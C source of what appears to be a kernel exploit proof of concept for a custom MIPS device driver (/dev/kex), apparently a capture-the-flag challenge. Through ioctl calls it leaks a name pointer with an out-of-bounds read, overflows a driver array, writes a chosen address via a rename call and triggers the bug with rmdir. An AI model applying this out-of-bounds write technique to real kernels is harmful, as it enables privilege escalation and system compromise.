#include <syscall.h>

// Compile with mipsel-linux-gnu-gcc -c test.c && mipsel-linux-gnu-ld test.o -o test

#define KEX_BASE 0x43544601
#define KEX_CREATE (KEX_BASE)
#define KEX_GETARR (KEX_BASE + 1)
#define KEX_SETARR (KEX_BASE + 2)
#define KEX_DELETE (KEX_BASE + 5)
#define KEX_RENAME (KEX_BASE + 7)


#define KEX_RMDIR 0x1111

struct kex_param {
  char name[32];
  int ind;
  int value;
};

struct kex_rename_param {
  char name[32];
  char new_name[32];
  int len;
};

const char str[] = "Hello world!\n";
int errno = 0;

void writeStr(int fd, char *str);

// Only takes up to three arguments
long syscall(long sysnum, ...) {
  errno = 0;
  int res;
  __asm__ volatile(
      "add $v0, $a0, $zero\n"
      "add $a0, $a1, $zero\n"
      "add $a1, $a2, $zero\n"
      "add $a2, $a3, $zero\n"
      "syscall\n"
      "add %0, $v0, $zero\n"
  : "=r"(res));
  if (res < 0) {
    writeStr(1, "ERROR!!!\n");
    errno = res;
    res = -1;
  }
  return res;
}

int strlen(char *s) {
  int len = 0;
  while (*s) {
    s++;
    len++;
  }
  return len;
}

void strncpy(char *dst, char *src, int maxsize) {
  while (maxsize --> 0) {
    if (!(*(dst++) = *(src++)))
      return;
  }
}

void exit(int exitcode) {
  syscall(SYS_exit, exitcode);
}

void writeStr(int fd, char *str) {
  syscall(SYS_write, fd, str, strlen(str));
}

const char hex[] = "0123456789abcdef";
void writeHex(int fd, int val, char* ending) {
  int nib = 8;
  while (nib --> 0) {
    syscall(SYS_write, fd, &hex[(val >> (nib * 4)) & 0xf], 1);
  }
  writeStr(fd, ending);
}

void checkErr(char *descript) {
  if (errno) {
    writeStr(2, descript);
    writeStr(2, ": ");
    writeHex(2, errno, "\n");
    exit(1);
  }
}

void __start() {
  syscall(SYS_open, "/sdafasdfas", 0);
  checkErr("should be an error");

  void* val = 0xffffff;
  int fd = syscall(SYS_open, "/dev/kex", 0);
  checkErr("open()");

  struct kex_param param;
  struct kex_rename_param rename_param;

  writeStr(1, "[*] Creating named array\n");
  strncpy(param.name, "kek", sizeof(param.name));

  syscall(SYS_ioctl, fd, KEX_CREATE, &param);
  checkErr("ioctl() create");

  param.name[0] = 0;
  param.ind = 0xff;
  param.value = 0;
  syscall(SYS_ioctl, fd, KEX_GETARR, &param);
  checkErr("ioctl() getarr");
  writeStr(1, "[*] Name pointer was at: 0x");
  writeHex(1, param.value, "\n");

  writeStr(1, "[*] Overwriting name pointer\n");
  for (int i = 0; i < 0x400; i++) {
    param.ind = i;
    param.value = 0x55555555;
    syscall(SYS_ioctl, fd, KEX_SETARR, &param);
  }


  //param.name[0] = 0x3;
  param.ind = 0xff;
  param.value = 0xffff;
  syscall(SYS_ioctl, fd, KEX_GETARR, &param);
  //checkErr("ioctl() getarr");
  writeStr(1, "[*] Name pointer is now pointing at: 0x");
  writeHex(1, param.value, "\n");

  writeStr(1, "[*] Writing to address\n");
  //rename_param.name[0] = 0x33;
  strncpy(rename_param.new_name, &val, 4);
  rename_param.len = 1111;
  syscall(SYS_ioctl, fd, KEX_RENAME, &rename_param);
  checkErr("ioctl() rename");

  writeStr(1, "[*] Triggering bug...\n");
  syscall(SYS_rmdir, "/dev/kek");

  exit(0);
}
